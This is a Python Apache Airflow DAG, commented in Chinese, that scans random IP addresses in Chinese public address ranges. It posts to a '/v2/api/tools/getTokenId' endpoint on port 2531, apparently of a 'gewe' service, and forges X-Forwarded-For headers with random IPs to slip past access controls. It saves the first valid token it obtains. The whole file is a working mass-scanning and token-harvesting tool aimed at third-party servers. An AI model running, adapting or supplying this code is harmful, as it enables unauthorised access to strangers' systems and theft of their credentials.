from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime, timedelta
import requests
import concurrent.futures
import random
from typing import List
import ipaddress
import time

# 默认参数
default_args = {
    'owner': 'airflow',
    'depends_on_past': False,
    'start_date': datetime(2024, 1, 1),
    'email_on_failure': False,
    'email_on_retry': False,
    'retries': 1,
    'retry_delay': timedelta(minutes=5),
}

# 中国主要公网IP段
CN_IP_RANGES = [
    ('1.0.0.0', '1.255.255.255'),       # APNIC
    ('14.0.0.0', '14.255.255.255'),     # APNIC
    ('27.0.0.0', '27.255.255.255'),     # APNIC
    ('36.0.0.0', '36.255.255.255'),     # APNIC
    ('39.0.0.0', '39.255.255.255'),     # APNIC
    ('42.0.0.0', '42.255.255.255'),     # APNIC
    ('49.0.0.0', '49.255.255.255'),     # APNIC
    ('58.0.0.0', '58.255.255.255'),     # APNIC
    ('59.0.0.0', '59.255.255.255'),     # APNIC
    ('60.0.0.0', '60.255.255.255'),     # APNIC
    ('61.0.0.0', '61.255.255.255'),     # APNIC
    ('101.0.0.0', '101.255.255.255'),   # APNIC
    ('103.0.0.0', '103.255.255.255'),   # APNIC
    ('106.0.0.0', '106.255.255.255'),   # APNIC
    ('110.0.0.0', '110.255.255.255'),   # APNIC
    ('111.0.0.0', '111.255.255.255'),   # APNIC
    ('112.0.0.0', '112.255.255.255'),   # APNIC
    ('113.0.0.0', '113.255.255.255'),   # APNIC
    ('114.0.0.0', '114.255.255.255'),   # APNIC
    ('115.0.0.0', '115.255.255.255'),   # APNIC
    ('116.0.0.0', '116.255.255.255'),   # APNIC
    ('117.0.0.0', '117.255.255.255'),   # APNIC
    ('119.0.0.0', '119.255.255.255'),   # APNIC
    ('120.0.0.0', '120.255.255.255'),   # APNIC
    ('121.0.0.0', '121.255.255.255'),   # APNIC
    ('122.0.0.0', '122.255.255.255'),   # APNIC
    ('123.0.0.0', '123.255.255.255'),   # APNIC
    ('124.0.0.0', '124.255.255.255'),   # APNIC
    ('125.0.0.0', '125.255.255.255'),   # APNIC
]

def ip_to_int(ip: str) -> int:
    parts = [int(part) for part in ip.split('.')]
    return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]

def int_to_ip(num: int) -> str:
    return f"{(num >> 24) & 255}.{(num >> 16) & 255}.{(num >> 8) & 255}.{num & 255}"

def generate_cn_target_ip() -> str:
    range_start, range_end = random.choice(CN_IP_RANGES)
    start_int = ip_to_int(range_start)
    end_int = ip_to_int(range_end)
    ip_int = random.randint(start_int, end_int)
    return int_to_ip(ip_int)

def is_public_ip(ip: str) -> bool:
    ip_obj = ipaddress.ip_address(ip)
    return not (
        ip_obj.is_private or
        ip_obj.is_loopback or
        ip_obj.is_link_local or
        ip_obj.is_multicast or
        ip_obj.is_reserved
    )

def generate_public_ip() -> str:
    while True:
        ip_parts = [str(random.randint(1, 255)) for _ in range(4)]
        ip = '.'.join(ip_parts)
        if is_public_ip(ip):
            return ip

def request_token(client_ip: str, target_server: str) -> dict:
    try:
        headers = {
            'X-Forwarded-For': client_ip,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        url = f'http://{target_server}:2531/v2/api/tools/getTokenId'
        response = requests.post(
            url,
            headers=headers,
            timeout=5
        )
        return {
            'client_ip': client_ip,
            'target_server': target_server,
            'status_code': response.status_code,
            'response': response.json() if response.status_code == 200 else None,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {
            'client_ip': client_ip,
            'target_server': target_server,
            'status_code': 0,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def scan_tokens(batch_size: int = 10, max_workers: int = 5, target_batch_size: int = 50, **context) -> dict:
    print(f"开始扫描，目标批次大小: {target_batch_size}, 每个目标并发数: {batch_size}")
    scan_count = 0
    
    while True:  # 持续扫描直到找到成功的请求
        # 生成一批目标服务器IP
        target_servers = [generate_cn_target_ip() for _ in range(target_batch_size)]
        scan_count += 1
        print(f"第 {scan_count} 轮扫描开始，目标数量: {len(target_servers)}")
        
        for target_server in target_servers:
            ips = [generate_public_ip() for _ in range(batch_size)]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {
                    executor.submit(request_token, ip, target_server): ip 
                    for ip in ips
                }
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result.get('status_code') == 200 and result.get('response', {}).get('ret') == 200:
                        print(f"发现有效目标: {result['target_server']}")
                        print(f"成功请求: {result}")
                        # 找到成功的请求，存储到 XCom 并返回
                        context['task_instance'].xcom_push(key='successful_token', value=result)
                        executor.shutdown(wait=False)
                        return result
            
            # 如果这批次没有成功，短暂等待后继续
            time.sleep(1)

# 创建 DAG
dag = DAG(
    'scan_gewe_tokens',
    default_args=default_args,
    description='扫描获取 token 的 DAG',
    schedule_interval=None,  # 设置为 None 表示只能手动触发
    catchup=False,
    max_active_runs=1
)

# 创建扫描任务
scan_task = PythonOperator(
    task_id='scan_tokens',
    python_callable=scan_tokens,
    op_kwargs={
        'batch_size': 10,          # 每个目标的并发请求数
        'max_workers': 5,          # 最大并发线程数
        'target_batch_size': 50,   # 每批扫描的目标服务器数量
    },
    dag=dag
)

scan_task
